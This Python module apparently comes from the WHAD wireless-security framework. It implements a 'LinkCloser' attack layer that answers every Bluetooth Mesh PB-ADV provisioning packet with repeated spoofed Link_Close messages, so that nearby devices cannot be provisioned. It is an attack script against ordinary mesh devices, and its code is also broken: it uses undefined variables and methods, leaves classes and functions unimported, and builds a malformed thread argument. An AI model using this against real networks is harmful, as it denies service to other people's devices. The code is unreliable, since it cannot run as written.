"""
PB-ADV bearer Layer modified for LinkCloser attack

Does almost nothing, but only on reaction to any PB-ADV message, we close the link to DoS.
"""

from os import urandom
from whad.common.stack import Layer, alias, instance
from whad.btmesh.stack.utils import (
    ProvisioningData,
    ProvisioningAuthenticationData,
)
from whad.scapy.layers.btmesh import (
    EIR_PB_ADV_PDU,
    BTMesh_Generic_Provisioning_Link_Open,
)
from scapy.layers.bluetooth import EIR_Hdr
from whad.btmesh.stack.gen_prov import (
    GenericProvisioningLayerProvisionee,
    GenericProvisioningLayerProvisioner,
)
from whad.btmesh.stack.pb_adv import PBAdvBearerLayer
from whad.btmesh.stack.gen_prov.message import GenericProvisioningMessage
from threading import Thread


@alias("pb_adv")
class LinkCloserLayer(Layer):
    def __init__(
        self,
        connector,
        options={},
    ):
        """
        Initiates the LinkCloser layer, replacing the PB-ADV layer

        :param connector: The connector that creates this layer
        :type connector: BTMesh
        :param options: [TODO:description], defaults to {}
        :type options: [TODO:type], optional
        """
        # list of Generic provisioning layers for each link_id
        super().__init__(options=options)

        # save connector (send RAW adv pdu)
        self.state.connector = connector

    def on_provisioning_pdu(self, packet):
        """
        Process an advertising packet containing a PB-ADV pdu
        We senf A Link_Close message direclty

        :param packet: [TODO:description]
        :type packet: EIR_PB_ADV_PDU
        """
        link_id = pb_adv_packet.link_id
        if isinstance(pb_adv_packet[1], BTMesh_Generic_Provisioning_Hdr):
            print(b"DETECTED PROVISIONING PACKET FOR LINK ID " + link_id)
            print("SENDING LINK CLOSE")
            for i in range(0, 5):
                self.send_raw(
                    EIR_Hdr(type=0x29)
                    / EIR_PB_ADV_PDU(
                        link_id=link_id,
                        transaction_number=0x00,
                        data=BTMesh_Generic_Provisioning_Link_Close(reason=0x02),
                    )
                )
                self._link_closed.append(link_id)
                sleep(uniform(0.02, 0.05))

    @instance("gen_prov")
    def on_gen_prov_received(self, source, message):
        """
        Process a packet sent by a Generic Provisining Layer Instance to be sent to peer

        :param self: [TODO:description]
        :type self: [TODO:type]
        :param source: [TODO:description]
        :type source: [TODO:type]
        :param message: [TODO:description]
        """
        packet = message.gen_prov_pkt
        transaction_number = message.transaction_number
        pkt = EIR_Hdr(type=0x29) / EIR_PB_ADV_PDU(
            link_id=self.state.current_link_id,
            transaction_number=transaction_number,
            data=packet,
        )

        thread = Thread(
            target=self.sending_thread,
            args=(pkt),
        )

        thread.start()

    def sending_thread(self, pkt):
        self.state.connector.send_raw(pkt)
